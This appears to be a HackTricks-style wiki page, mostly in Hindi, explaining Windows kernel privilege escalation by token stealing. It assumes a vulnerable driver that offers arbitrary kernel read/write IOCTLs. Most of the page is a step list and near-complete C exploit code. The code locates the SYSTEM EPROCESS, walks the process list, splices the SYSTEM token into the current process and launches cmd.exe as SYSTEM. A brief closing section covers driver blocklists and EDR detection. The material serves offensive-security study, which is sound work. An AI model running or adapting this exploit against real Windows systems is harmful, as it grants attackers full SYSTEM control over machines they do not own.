# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

यदि कोई vulnerable driver ऐसा IOCTL expose करता है जो attacker को arbitrary kernel read और/या write primitives देता है, तो SYSTEM access token चुराकर NT AUTHORITY\SYSTEM तक elevate करना अक्सर संभव होता है। यह technique SYSTEM process के EPROCESS से Token pointer को current process के EPROCESS में copy करती है।<sup>[[2]](#references)</sup>

यह क्यों काम करता है:
- प्रत्येक process में एक EPROCESS structure होता है, जिसमें अन्य fields के साथ एक Token होता है (वास्तव में यह token object का EX_FAST_REF होता है)।
- SYSTEM process (PID 4) के पास सभी privileges enabled वाला token होता है।
- वर्तमान process के EPROCESS.Token को SYSTEM token pointer से replace करने पर current process तुरंत SYSTEM के रूप में run करने लगता है।<sup>[[1]](#references)</sup>

> EPROCESS में offsets अलग-अलग Windows versions पर बदलते हैं। उन्हें dynamically (symbols) निर्धारित करें या version-specific constants का उपयोग करें। यह भी याद रखें कि EPROCESS.Token एक EX_FAST_REF है (निचले 3 bits reference count flags होते हैं)।

## High-level steps

1) ntoskrnl.exe का base locate करें और PsInitialSystemProcess का address resolve करें।
- User mode से loaded driver bases प्राप्त करने के लिए NtQuerySystemInformation(SystemModuleInformation) या EnumDeviceDrivers का उपयोग करें।
- PsInitialSystemProcess के offset (symbols/reversing से प्राप्त) को kernel base में जोड़कर उसका address प्राप्त करें।
2) PsInitialSystemProcess पर मौजूद pointer को read करें → यह SYSTEM के EPROCESS का kernel pointer है।
3) SYSTEM EPROCESS से UniqueProcessId और ActiveProcessLinks offsets read करें, फिर EPROCESS structures की doubly linked list (ActiveProcessLinks.Flink/Blink) traverse करें, जब तक आपको ऐसा EPROCESS न मिल जाए जिसका UniqueProcessId GetCurrentProcessId() के बराबर हो। दोनों को रखें:
- EPROCESS_SYSTEM (SYSTEM के लिए)
- EPROCESS_SELF (current process के लिए)
4) SYSTEM token value read करें: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset)।
- निचले 3 bits को mask out करें: Token_SYS_masked = Token_SYS & ~0xF (build के आधार पर आमतौर पर ~0xF या ~0x7; x64 पर निचले 3 bits उपयोग होते हैं — 0xFFFFFFFFFFFFFFF8 mask)।
5) Option A (common): अपने current token के निचले 3 bits को preserve करें और उन्हें SYSTEM के pointer पर splice करें, ताकि embedded ref count consistent रहे।
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) अपने kernel write primitive का उपयोग करके Token_NEW को (EPROCESS_SELF + TokenOffset) में write करें।
7) आपका current process अब SYSTEM है। पुष्टि करने के लिए optional रूप से नया cmd.exe या powershell.exe spawn करें।<sup>[[1]](#references)</sup>

## Pseudocode

नीचे दिया गया skeleton vulnerable driver से केवल दो IOCTLs का उपयोग करता है: एक 8-byte kernel read के लिए और दूसरा 8-byte kernel write के लिए। इसे अपने driver के interface से replace करें।<sup>[[1]](#references)</sup>
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
नोट्स:
- Offsets: सही offsets प्राप्त करने के लिए target के PDBs के साथ WinDbg का `dt nt!_EPROCESS` या runtime symbol loader उपयोग करें। बिना जाँच के hardcode न करें।
- Mask: x64 पर token एक EX_FAST_REF होता है; निचले 3 bits reference count bits होते हैं। अपने token के मूल low bits बनाए रखने से तत्काल refcount inconsistencies से बचा जा सकता है।
- Stability: current process को elevate करना बेहतर है; यदि आप किसी short-lived helper को elevate करते हैं, तो उसके exit होने पर SYSTEM access खो सकता है।<sup>[[1]](#references)</sup>

## Detection & mitigation
- शक्तिशाली IOCTLs expose करने वाले unsigned या untrusted third-party drivers को load करना इसका root cause है।
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard और Attack Surface Reduction rules vulnerable drivers को load होने से रोक सकते हैं।
- EDR suspicious IOCTL sequences पर निगरानी रख सकता है, जो arbitrary read/write और token swaps लागू करते हैं।

## References

- [1] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [2] [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
